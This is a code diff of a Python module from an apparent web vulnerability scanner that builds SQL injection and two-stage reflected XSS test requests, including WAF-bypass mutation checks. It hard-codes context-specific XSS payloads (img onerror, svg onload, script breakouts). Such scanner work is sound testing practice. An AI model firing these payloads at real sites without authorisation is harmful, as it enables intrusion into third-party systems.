@@ -1,51 +1,73 @@
 """
 scan_targets.json → HTTP task 목록 변환
 
-inject_mode 계약 (executor.py와 인터페이스)
-  replace : 파라미터 값을 payload로 완전 교체
-  append  : 파라미터 값 = base_value + payload
+XSS 탐지 흐름 (2단계):
+  1단계 probe  : IBDS_REFLECT_{token} / IBDS_ESC_{token}<>"'& 주입 → 반사 위치/필터 파악
+  2단계 attack : probe 결과를 바탕으로 컨텍스트 맞는 XSS 페이로드 주입
 
-inject_mode 결정 규칙
-  XSS 전체           → replace  (완성된 HTML/JS 페이로드)
-  SQLI_ERROR_META    → replace  (메타문자 단독 주입)
-  SQLI_BOOLEAN 등    → append   (원본값 + SQL suffix, ZAP origParamValue 방식)
+SQLi 탐지 흐름:
+  attack_requests payload_templates의 {value} placeholder를 base_value로 치환 후 replace 주입
+  (executor inject_mode=replace로 통일, append 없음)
 """
 
 from __future__ import annotations
 
 import json
+import secrets
 from pathlib import Path
 from typing import List
 
-from scanner.payload import xss as xss_mod
-from scanner.payload import sqli as sqli_mod
+_ATTACK_LIST_PATH = Path("attack_request_list.json")
 
-# CSRF 토큰 갱신이 필요한 파라미터 이름 키워드
+
+def _load_rules(vuln_type: str) -> list:
+    with open(_ATTACK_LIST_PATH, encoding="utf-8") as f:
+        data = json.load(f)
+    return [r for r in data["rules"] if r["vuln_type"] == vuln_type]
+
 _CSRF_KEYWORDS = {"token", "csrf", "nonce"}
 
-# append 방식으로 주입하는 SQLi 타입 집합
-_SQLI_APPEND_TYPES = {
-    "SQLI_BOOLEAN",
-    "SQLI_UNION",
-    "SQLI_ORDERBY",
-    "SQLI_TIME_MYSQL",
-    "SQLI_TIME_PGSQL",
-    "SQLI_TIME_MSSQL",
-    "SQLI_TIME_ORACLE",
-    "SQLI_STACKED",
+_TECHNIQUE_TO_PTYPE = {
+    "error":    "SQLI_ERROR_META",
+    "boolean":  "SQLI_BOOLEAN",
+    "time":     "SQLI_TIME_MYSQL",
+    "order_by": "SQLI_ORDERBY",
+}
+
+_STRENGTH_TECHNIQUES = {
+    "LOW":    {"error"},
+    "MEDIUM": {"error", "boolean"},
+    "HIGH":   {"error", "boolean", "time"},
+    "INSANE": {"error", "boolean", "time", "order_by"},
 }
 
 
+def _normalize_target(target: dict) -> dict:
+    if "parameters" in target:
+        return target
+    params = target.get("params") or {}
+    scannable = set(target.get("scannable_params") or params.keys())
+    param_location = target.get("param_location", "query")
+    parameters = [
+        {
+            "name": name,
+            "scan": name in scannable,
+            "sample_values": [value] if value else [],
+            "request_location": param_location,
+        }
+        for name, value in params.items()
+    ]
+    return {**target, "parameters": parameters, "can_scan": bool(scannable)}
+
+
 def load_targets(session_dir: str | Path) -> List[dict]:
-    """session_dir/scan_targets.json 로드 후 반환"""
     path = Path(session_dir) / "scan_targets.json"
     with open(path, encoding="utf-8") as f:
-        return json.load(f)
+        raw = json.load(f)
+    return [_normalize_target(t) for t in raw]
 
 
 def _base_params(parameters: List[dict]) -> dict:
-    """전체 파라미터의 원본값 dict 반환 (scan 여부 무관)
-    scan=false인 CSRF 토큰 등도 요청에 포함해야 서버가 정상 처리함"""
     result: dict = {}
     for p in parameters:
         name = p.get("name", "")
@@ -57,99 +79,298 @@ def _base_params(parameters: List[dict]) -> dict:
 
 
 def _base_value(param: dict) -> str:
-    """파라미터의 첫 번째 샘플값 반환 (없으면 빈 문자열)"""
     vals = param.get("sample_values") or []
     return str(vals[0]) if vals else ""
 
 
-def _inject_mode(payload_type: str, vuln: str) -> str:
-    """payload type → inject_mode 결정"""
-    if vuln == "xss":
-        return "replace"
-    if payload_type == "SQLI_ERROR_META":
-        return "replace"
-    if payload_type in _SQLI_APPEND_TYPES:
-        return "append"
-    return "replace"
+def _needs_csrf(parameters: List[dict]) -> bool:
+    return any(
+        not p.get("scan", True)
+        and any(kw in (p.get("name") or "").lower() for kw in _CSRF_KEYWORDS)
+        for p in parameters
+    )
 
 
-def _build_tasks_for_target(
+def _expand_templates(
+    payload_templates: dict,
+    sequence: list,
+    base_value: str,
+) -> list[tuple[str, str]]:
+    """attack step의 (완성 payload, step 이름) 목록. baseline은 제외."""
+    results = []
+    for step in sequence:
+        if step == "baseline":
+            continue
+        for tmpl in payload_templates.get(step, []):
+            try:
+                payload = tmpl.format(value=base_value, token="")
+            except KeyError:
+                payload = tmpl
+            results.append((payload, step))
+    return results
+
+
+def _common_task_fields(
     target: dict,
+    param: dict,
+    base_params: dict,
     target_idx: int,
-    strength: str,
-    scan_xss: bool,
-    scan_sqli: bool,
+    param_idx: int,
+) -> dict:
+    return {
+        "url":             target.get("base_url", ""),
+        "method":          target.get("method", "GET").upper(),
+        "enctype":         target.get("enctype", "application/x-www-form-urlencoded"),
+        "inject_location": param.get("request_location", "query"),
+        "inject_param":    param.get("name", ""),
+        "base_params":     dict(base_params),
+        "base_headers":    dict(target.get("headers") or {}),
+        "base_cookies":    dict(target.get("cookies") or {}),
+        "base_value":      _base_value(param),
+        "needs_csrf_refresh": _needs_csrf(target.get("parameters") or []),
+        "source_url":      target.get("base_url", ""),
+    }
+
+
+def build_sqli_tasks(
+    targets: List[dict],
+    strength: str = "MEDIUM",
 ) -> List[dict]:
-    """타겟 하나에 대한 task 목록 생성"""
-    tasks: List[dict] = []
+    allowed = _STRENGTH_TECHNIQUES.get(strength.upper(), _STRENGTH_TECHNIQUES["MEDIUM"])
+    sqli_rules = [r for r in _load_rules("sqli") if r["technique"] in allowed]
 
-    url = target.get("base_url", "")
-    method = target.get("method", "GET").upper()
-    enctype = target.get("enctype", "application/x-www-form-urlencoded")
-    cookies = dict(target.get("cookies") or {})
-    headers = dict(target.get("headers") or {})
-    parameters = target.get("parameters") or []
-    role = target.get("role", "guest")
+    all_tasks: List[dict] = []
 
-    base_params = _base_params(parameters)
+    for target_idx, target in enumerate(targets):
+        if not target.get("can_scan", True):
+            continue
 
-    # scan=true인 파라미터만 주입 대상으로 선택
-    scan_params = [p for p in parameters if p.get("scan", True)]
+        parameters = target.get("parameters") or []
+        base_params = _base_params(parameters)
+        scan_params = [p for p in parameters if p.get("scan", True)]
 
-    for param_idx, param in enumerate(scan_params):
-        param_name = param.get("name", "")
-        location = param.get("request_location", "query")
-        orig_value = _base_value(param)
+        for param_idx, param in enumerate(scan_params):
+            param_name = param.get("name", "")
+            orig_value = _base_value(param)
+            common = _common_task_fields(target, param, base_params, target_idx, param_idx)
 
-        payloads: List[dict] = []
+            for rule in sqli_rules:
+                technique = rule["technique"]
+                ptype = _TECHNIQUE_TO_PTYPE.get(technique, "SQLI_ERROR_META")
+                payloads = _expand_templates(rule["payload_templates"], rule["sequence"], orig_value)
 
-        if scan_xss:
-            for p in xss_mod.get_by_context("unknown", strength):
-                payloads.append(("xss", p))
+                for p_idx, (payload, step) in enumerate(payloads):
+                    all_tasks.append({
+                        **common,
+                        "id":             f"{target_idx}_{param_name}_sqli_{technique}_{p_idx}",
+                        "point":          param_name,
+                        "payload":        payload,
+                        "payload_type":   ptype,
+                        "payload_family": f"{technique}_{step}",
+                        "inject_mode":    "replace",
+                        "meta": {
+                            "role":         target.get("role", "guest"),
+                            "target_index": target_idx,
+                            "param_index":  param_idx,
+                            "vuln_scan":    "sqli",
+                            "attack_id":    rule["attack_id"],
+                            "step":         step,
+                        },
+                    })
 
-        if scan_sqli:
-            for p in sqli_mod.get_by_strength(strength):
-                payloads.append(("sqli", p))
+    return all_tasks
 
-        for payload_idx, (vuln, payload_dict) in enumerate(payloads):
-            ptype = payload_dict["type"]
-            family = payload_dict["family"]
-            raw_payload = payload_dict["payload"]
-            mode = _inject_mode(ptype, vuln)
 
-            task_id = f"{target_idx}_{param_name}_{vuln}_{payload_idx}"
+def build_xss_probe_tasks(targets: List[dict]) -> List[dict]:
+    """XSS 1단계: reflection + escape probe 태스크 생성."""
+    xss_rules = {r["technique"]: r for r in _load_rules("xss")}
 
-            tasks.append({
-                "id": task_id,
-                "url": url,
-                "method": method,
-                "enctype": enctype,
-                "point": param_name,
-                "payload": raw_payload,
-                "payload_type": ptype,
-                "payload_family": family,
-                "inject_mode": mode,
-                "inject_location": location,
-                "inject_param": param_name,
-                "base_params": dict(base_params),
-                "base_headers": headers,
-                "base_cookies": cookies,
-                "base_value": orig_value,
-                "needs_csrf_refresh": any(
-                    not p.get("scan", True)
-                    and any(kw in (p.get("name") or "").lower() for kw in _CSRF_KEYWORDS)
-                    for p in parameters
-                ),
-                "source_url": url,
-                "meta": {
-                    "role": role,
-                    "target_index": target_idx,
-                    "param_index": param_idx,
-                    "vuln_scan": vuln,
-                },
-            })
+    reflect_rule = xss_rules.get("reflection")
+    escape_rule  = xss_rules.get("escape")
 
-    return tasks
+    all_tasks: List[dict] = []
+
+    for target_idx, target in enumerate(targets):
+        if not target.get("can_scan", True):
+            continue
+
+        parameters = target.get("parameters") or []
+        base_params = _base_params(parameters)
+        scan_params = [p for p in parameters if p.get("scan", True)]
+
+        for param_idx, param in enumerate(scan_params):
+            param_name = param.get("name", "")
+            orig_value = _base_value(param)
+            common = _common_task_fields(target, param, base_params, target_idx, param_idx)
+
+            # (url, param)별 고정 토큰 — 두 probe가 같은 token 공유해서 analyzer가 매핑 가능
+            token = secrets.token_hex(6).upper()
+
+            for probe_type, rule in [("reflection", reflect_rule), ("escape", escape_rule)]:
+                if not rule:
+                    continue
+                # baseline 제외 첫 번째 step 페이로드만 사용
+                for step in rule["sequence"]:
+                    if step == "baseline":
+                        continue
+                    for t_idx, tmpl in enumerate(rule["payload_templates"].get(step, [])):
+                        try:
+                            payload = tmpl.format(token=token, value=orig_value)
+                        except KeyError:
+                            payload = tmpl
+
+                        all_tasks.append({
+                            **common,
+                            "id":             f"{target_idx}_{param_name}_xss_probe_{probe_type}_{t_idx}",
+                            "point":          param_name,
+                            "payload":        payload,
+                            "payload_type":   "XSS_PROBE",
+                            "payload_family": f"probe_{probe_type}",
+                            "inject_mode":    "replace",
+                            "meta": {
+                                "role":           target.get("role", "guest"),
+                                "target_index":   target_idx,
+                                "param_index":    param_idx,
+                                "vuln_scan":      "xss",
+                                "attack_id":      rule["attack_id"],
+                                "step":           step,
+                                "xss_probe_token": token,
+                                "xss_probe_type":  probe_type,
+                            },
+                        })
+                    break  # 첫 번째 non-baseline step만 사용
+
+    return all_tasks
+
+
+def build_xss_attack_tasks(
+    targets: List[dict],
+    reflected_params: dict,
+) -> List[dict]:
+    """XSS 2단계: probe에서 반사 확인된 파라미터에만 실제 공격 페이로드 주입.
+
+    reflected_params: {(url, param_name): {"context": str, "escaped_chars": set}}
+    """
+    all_tasks: List[dict] = []
+
+    for target_idx, target in enumerate(targets):
+        if not target.get("can_scan", True):
+            continue
+
+        parameters = target.get("parameters") or []
+        base_params = _base_params(parameters)
+        scan_params = [p for p in parameters if p.get("scan", True)]
+
+        for param_idx, param in enumerate(scan_params):
+            param_name = param.get("name", "")
+            common = _common_task_fields(target, param, base_params, target_idx, param_idx)
+
+            probe_info = reflected_params.get((common["url"], param_name))
+            if not probe_info:
+                continue
+
+            context = probe_info.get("context", "body")
+            escaped_chars = probe_info.get("escaped_chars", set())
+
+            for p_idx, (payload, family) in enumerate(_select_xss_payloads(context, escaped_chars)):
+                all_tasks.append({
+                    **common,
+                    "id":             f"{target_idx}_{param_name}_xss_attack_{p_idx}",
+                    "point":          param_name,
+                    "payload":        payload,
+                    "payload_type":   "REFLECTED_XSS",
+                    "payload_family": family,
+                    "inject_mode":    "replace",
+                    "meta": {
+                        "role":         target.get("role", "guest"),
+                        "target_index": target_idx,
+                        "param_index":  param_idx,
+                        "vuln_scan":    "xss",
+                        "xss_context":  context,
+                    },
+                })
+
+    return all_tasks
+
+
+def _select_xss_payloads(context: str, escaped_chars: set) -> list[tuple[str, str]]:
+    """컨텍스트 + 필터 특성 → (payload, family) 목록."""
+    if context == "script":
+        if '"' not in escaped_chars:
+            return [('";alert(1);//', "sc_dq_break"), ('";alert(document.domain);//', "sc_dq_domain")]
+        if "'" not in escaped_chars:
+            return [("';alert(1);//", "sc_sq_break"), ("';alert(document.domain);//", "sc_sq_domain")]
+        return [("alert`1`", "sc_backtick")]
+
+    if context == "attr_value":
+        if '"' not in escaped_chars and "<" not in escaped_chars:
+            return [('"><img src=x onerror=alert(1)>', "av_dq_img"), ('"><svg onload=alert(1)>', "av_dq_svg")]
+        if "'" not in escaped_chars and "<" not in escaped_chars:
+            return [("'><img src=x onerror=alert(1)>", "av_sq_img"), ("'><svg onload=alert(1)>", "av_sq_svg")]
+        if '"' not in escaped_chars:
+            return [('" onmouseover=alert(1) x="', "av_dq_event"), ('" autofocus onfocus=alert(1) x="', "av_dq_focus")]
+        if "'" not in escaped_chars:
+            return [("' onmouseover=alert(1) x='", "av_sq_event")]
+        return [("`-alert(1)-`", "av_backtick")]
+
+    # body (기본 + fallback)
+    if "<" not in escaped_chars:
+        return [
+            ("<img src=x onerror=alert(1)>", "body_img_onerror"),
+            ("<svg onload=alert(1)>", "body_svg_onload"),
+            ("<scrIpt>alert(1);</scRipt>", "body_script_mixed"),
+        ]
+    return [
+        ("<img/src=x/onerror=alert(1)>", "body_img_slash"),
+        ("<svg/onload=alert(1)>", "body_svg_slash"),
+    ]
+
+
+def build_mutation_tasks(mutations: List[dict], targets: List[dict]) -> List[dict]:
+    """mutations.json 항목 → 재전송용 HTTP task 목록 (WAF/PHPIDS 우회 검증용).
+
+    mutation의 meta.target_index/param_index로 원본 target/param을 다시 찾아
+    mutated_payload로 실제 요청을 재구성한다.
+    """
+    all_tasks: List[dict] = []
+
+    for m_idx, m in enumerate(mutations):
+        meta = m.get("meta") or {}
+        target_idx = meta.get("target_index")
+        param_idx = meta.get("param_index")
+        if target_idx is None or param_idx is None:
+            continue
+        if not (0 <= target_idx < len(targets)):
+            continue
+
+        target = targets[target_idx]
+        parameters = target.get("parameters") or []
+        scan_params = [p for p in parameters if p.get("scan", True)]
+        if not (0 <= param_idx < len(scan_params)):
+            continue
+        param = scan_params[param_idx]
+
+        base_params = _base_params(parameters)
+        common = _common_task_fields(target, param, base_params, target_idx, param_idx)
+
+        all_tasks.append({
+            **common,
+            "id":             f"mutverify_{m_idx}_{target_idx}_{param.get('name', '')}",
+            "point":          param.get("name", ""),
+            "payload":        m.get("mutated_payload"),
+            "payload_type":   m.get("payload_type"),
+            "payload_family": f"{m.get('payload_family', '')}_mutverify",
+            "inject_mode":    "replace",
+            "meta": {
+                **meta,
+                "mutation_verify":  True,
+                "original_payload": m.get("payload"),
+                "mutation_desc":    m.get("mutation_desc"),
+                "vuln_type":        m.get("vuln_type"),
+            },
+        })
+
+    return all_tasks
 
 
 def build_tasks(
@@ -158,44 +379,10 @@ def build_tasks(
     scan_xss: bool = True,
     scan_sqli: bool = True,
 ) -> List[dict]:
-    """scan_targets 목록 → task 목록 변환
-
-    can_scan=false 타겟은 자동으로 제외한다.
-    strength: LOW | MEDIUM | HIGH | INSANE
-    """
+    """하위 호환용 — SQLi + XSS probe를 한번에 반환."""
     all_tasks: List[dict] = []
-
-    for idx, target in enumerate(targets):
-        if not target.get("can_scan", True):
-            continue
-        tasks = _build_tasks_for_target(
-            target, idx, strength, scan_xss, scan_sqli
-        )
-        all_tasks.extend(tasks)
-
+    if scan_sqli:
+        all_tasks.extend(build_sqli_tasks(targets, strength=strength))
+    if scan_xss:
+        all_tasks.extend(build_xss_probe_tasks(targets))
     return all_tasks
-
-
-if __name__ == "__main__":
-    import sys
-
-    if len(sys.argv) < 2:
-        print("usage: python -m scanner.injector <session_dir> [strength]")
-        sys.exit(1)
-
-    session_dir = sys.argv[1]
-    strength = sys.argv[2] if len(sys.argv) > 2 else "MEDIUM"
-
-    targets = load_targets(session_dir)
-    tasks = build_tasks(targets, strength=strength)
-
-    scannable = sum(1 for t in targets if t.get("can_scan", True))
-    print(f"targets={len(targets)}  can_scan={scannable}")
-    print(f"tasks={len(tasks)}  strength={strength}")
-
-    by_vuln: dict = {}
-    for t in tasks:
-        v = t["meta"]["vuln_scan"]
-        by_vuln[v] = by_vuln.get(v, 0) + 1
-    for v, cnt in sorted(by_vuln.items()):
-        print(f"  {v}: {cnt}개")
